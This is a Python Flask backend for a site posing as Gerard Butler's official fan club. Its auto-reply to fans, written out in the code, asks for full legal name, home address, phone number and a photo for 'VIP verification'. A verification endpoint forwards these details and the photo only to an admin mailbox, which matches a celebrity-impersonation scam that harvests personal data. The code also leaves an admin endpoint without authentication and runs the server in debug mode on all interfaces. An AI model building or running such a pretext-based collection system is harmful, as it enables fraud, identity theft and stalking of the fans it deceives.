import threading
import time
import bleach
from flask import Flask, request, jsonify
from flask_cors import CORS
from werkzeug.utils import secure_filename
from email_service import send_email, get_admin_html, get_fan_html, get_verification_admin_html, ADMIN_EMAIL

app = Flask(__name__)
CORS(app)

def process_emails_in_background(fan_name: str, fan_email: str, message: str):
    print(f"Background task started for {fan_email}")
    
    # 1. Admin Notification
    admin_subject = f"Fan message from {fan_name}"
    admin_text = f"New message received.\n\nFrom: {fan_name} ({fan_email})\n\n{message}\n\n---\nSent via gerardbutlerofficial.com"
    admin_html = get_admin_html(fan_name, fan_email, message)
    send_email(ADMIN_EMAIL, admin_subject, admin_text, admin_html)
    
    # 2. Fan Auto-Reply
    fan_subject = "VIP Registration: Next Steps — Gerard Butler Fan Club"
    fan_text = f"Hi {fan_name},\n\nThank you for submitting your initial application. To finalize your exclusive membership and verify your identity, we need a few more details for our secure records.\n\nPlease reply directly to this email and provide the following:\n- Full Legal Name\n- Home Address (Required for shipping exclusive merchandise)\n- Phone Number\n- A recent photo of yourself (Please attach the image to your email reply)\n\nOnce we receive this information, our management team will review your profile and activate your VIP status.\n\nWarm regards,\nThe Gerard Butler Fan Club Team\ngerardbutlerofficial.com"
    fan_html = get_fan_html(fan_name, fan_email)
    send_email(fan_email, fan_subject, fan_text, fan_html)
    
    print(f"Background task completed for {fan_email}")

def process_verification_in_background(fan_name: str, fan_email: str, phone: str, address: str, filename: str, content_type: str, file_data: bytes):
    print(f"Verification background task started for {fan_email}")
    
    admin_subject = f"VIP Profile Submitted: {fan_name}"
    admin_text = f"New VIP profile submitted.\nName: {fan_name}\nEmail: {fan_email}\nPhone: {phone}\nAddress: {address}\n\nPhoto attached."
    admin_html = get_verification_admin_html(fan_name, fan_email, phone, address)
    
    attachment = (filename, content_type, file_data)
    
    # Send only to admin for review
    send_email(ADMIN_EMAIL, admin_subject, admin_text, admin_html, attachment=attachment)
    
    print(f"Verification background task completed for {fan_email}")

def mock_save_to_database(data: dict):
    # Simulate DB latency
    time.sleep(0.1)
    data["id"] = f"msg_{int(time.time() * 1000)}"
    return data

@app.route("/api/fanclub/messages", methods=["POST"])
def handle_new_message():
    try:
        data = request.json
        fan_name = data.get("fanName", "")
        fan_email = data.get("fanEmail", "")
        message = data.get("message", "")
        
        # Sanitize inputs (XSS prevention)
        clean_name = bleach.clean(fan_name, tags=[], strip=True).replace("\n", " ").strip()
        clean_message = bleach.clean(message, tags=[], strip=True).strip()
        
        if not clean_name or not clean_message or not fan_email:
            return jsonify({"error": "Invalid content in fields"}), 400

        # Save to mock database
        saved_record = mock_save_to_database({
            "name": clean_name,
            "email": fan_email,
            "message": clean_message
        })
        
        # Dispatch email sending to background task using a standard Python thread
        bg_thread = threading.Thread(
            target=process_emails_in_background,
            args=(clean_name, fan_email, clean_message)
        )
        bg_thread.start()
        
        return jsonify({
            "success": True,
            "message": "Message securely saved and notifications queued.",
            "data": saved_record
        }), 201
        
    except Exception as e:
        print(f"Error handling request: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/api/fanclub/verify", methods=["POST"])
def handle_verification():
    try:
        fan_name = request.form.get("name", "")
        fan_email = request.form.get("email", "")
        phone = request.form.get("phone", "")
        address = request.form.get("address", "")
        photo = request.files.get("photo")
        
        clean_name = bleach.clean(fan_name, tags=[], strip=True).strip()
        clean_email = bleach.clean(fan_email, tags=[], strip=True).strip()
        clean_phone = bleach.clean(phone, tags=[], strip=True).strip()
        clean_address = bleach.clean(address, tags=[], strip=True).strip()
        
        if not clean_name or not clean_email or not photo:
            return jsonify({"error": "Missing required fields"}), 400
            
        filename = secure_filename(photo.filename)
        content_type = photo.content_type
        file_data = photo.read()
        
        # Dispatch email sending to background task
        bg_thread = threading.Thread(
            target=process_verification_in_background,
            args=(clean_name, clean_email, clean_phone, clean_address, filename, content_type, file_data)
        )
        bg_thread.start()
        
        return jsonify({
            "success": True,
            "message": "Profile submitted successfully."
        }), 201
        
    except Exception as e:
        print(f"Error handling verification: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route("/api/admin/set-poster", methods=["POST"])
def handle_set_poster():
    try:
        data = request.json
        source = data.get("source", "")
        target = data.get("target", "poster_greenland.jpg")
        
        import os
        import shutil
        
        allowed_sources = [
            "poster_greenland.jpg",
            "poster_greenland_migration.jpg",
            "user_shot_1.png",
            "user_shot_2.png",
            "user_shot_3.png",
            "user_shot_4.png"
        ]
        
        if source not in allowed_sources:
            return jsonify({"error": "Invalid source image"}), 400
            
        if target != "poster_greenland.jpg":
            return jsonify({"error": "Invalid target"}), 400
            
        img_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "img"))
        source_path = os.path.join(img_dir, source)
        target_path = os.path.join(img_dir, target)
        
        if not os.path.exists(source_path):
            return jsonify({"error": f"Source image {source} not found"}), 404
            
        shutil.copyfile(source_path, target_path)
        
        return jsonify({
            "success": True,
            "message": f"Poster successfully updated to {source}!"
        }), 200
    except Exception as e:
        print(f"Error swapping poster: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/health", methods=["GET"])
def healthcheck():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000, debug=True)
